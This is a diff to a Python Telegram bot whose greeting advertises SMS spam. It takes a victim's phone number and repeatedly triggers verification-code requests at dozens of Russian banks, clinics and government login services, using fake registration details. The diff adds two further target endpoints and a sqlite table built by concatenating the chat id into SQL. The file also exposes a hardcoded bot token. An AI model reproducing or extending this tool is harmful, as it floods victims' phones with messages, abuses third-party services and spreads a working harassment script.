@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import telebot, requests, random, datetime, sys, time, argparse, json, re
+import telebot, requests, random, datetime, sys, time, argparse, json, re, sqlite3
 from telebot import types
 bot = telebot.TeleBot("965521501:AAHYwmNj3gR4xbJTDH9HsZkme0kObgrwI3o")
 owner = 355821673
@@ -9,6 +9,8 @@ def sleep(x):
 	except:
 		pass
 
+db = sqlite3.connect("users.db")
+dbs = db.cursor()
 
 @bot.message_handler(commands=["ping"])
 def ping(message):
@@ -70,9 +72,9 @@ def addbl(message):
 		if message.chat.id == owner:
 			newloser = f'{message.text[7:]}'
 			if newloser == '':
-				bot.send_message(owner, "Введите номер телефона пользователя")
+				bot.send_message(owner, "Введите номер id пользователя")
 			else:
-				f = open('idWL.txt' , 'a')
+				f = open('idBL.txt' , 'a')
 				f.write(f'{newloser}' + '\n')
 				f.close()
 				bot.send_message(owner, "Добавлен новый пользователь в черный лист: "+f'{newloser}')
@@ -84,6 +86,9 @@ def addbl(message):
 @bot.message_handler(commands=['start']) 
 def handle_start(message): 
 	try:
+		db = sqlite3.connect("users.db")
+		dbs = db.cursor()
+		dbs.execute("CREATE TABLE id"+f'{message.chat.id}'+" (phone text, count text)")
 		bot.send_message(owner, "Новый пользователь: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nUsername: @"+f'{message.chat.username}'+"\niD: "+f'{message.chat.id}', parse_mode="HTML")
 		bot.send_message(message.chat.id, 'Привет, ' + message.chat.first_name + '\nЯ бот от @FSystem88.\nОтправь мне номер телефона в формате 79xxxxxxxxx, чтобы начать СМС спам.\n\nВообще как бы сервисов много, но из-за того, что трафик проходит через VPN соединение (спасибо РКН за блокировку Telegram на территории РФ), то смсок доходит только около 17.\nБуду решать эту проблему.')
 	except:
@@ -199,6 +204,7 @@ def main(message):
 					gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})
 					loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={'login': _phone, 'attr': ''})
 					alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
+					invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
 					onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
 					psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
 					raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
@@ -206,6 +212,7 @@ def main(message):
 					utair = requests.post('https://b.utair.ru/api/v1/login/', json={"login":_phone})
 					aresbank = requests.post('https://www.aresbank.ru/ajax/register.php', data={'REGISTER[NAME]': 'Иванов Иван Иванович','REGISTER[PERSONAL_PHONE]': _phoneAresBank,'REGISTER[LOGIN]': _name+f'{iteration}','REGISTER[PASSWORD]': _name+'-/'+_name,'REGISTER[CONFIRM_PASSWORD]': _name+'-/'+_name,'REGISTER[ACTION]': 'register','register_submit_button': 'Регистрация'})
 					modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':_phone9,'Package':'optimal'})
+					sfera = requests.post('https://sfera.ru/api/quiz/id', json={"phone":_phonePizzahut,"regno":"1021400692048"})
 					bystrobank = requests.post('https://www.bystrobank.ru/publogin/web/register.php', data={'referer::-0':'','realm::-0':'bbpwd','loginName-0':_name,'password::-0':_name,'passwordRepeat::-0':_name,'phoneNumber::-0':_phone9,'ruPhoneCheck::-0':'true','email::-0':_email,'registration':'','serviceName-0':'lc'})
 					bot.send_message(message.chat.id, "GOOD!")
 				else: 
@@ -215,4 +222,3 @@ def main(message):
 		bot.send_message(owner, "Завершен спам:\nUser: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nPhone: "+_phone , parse_mode="HTML")
 
 bot.polling()
-
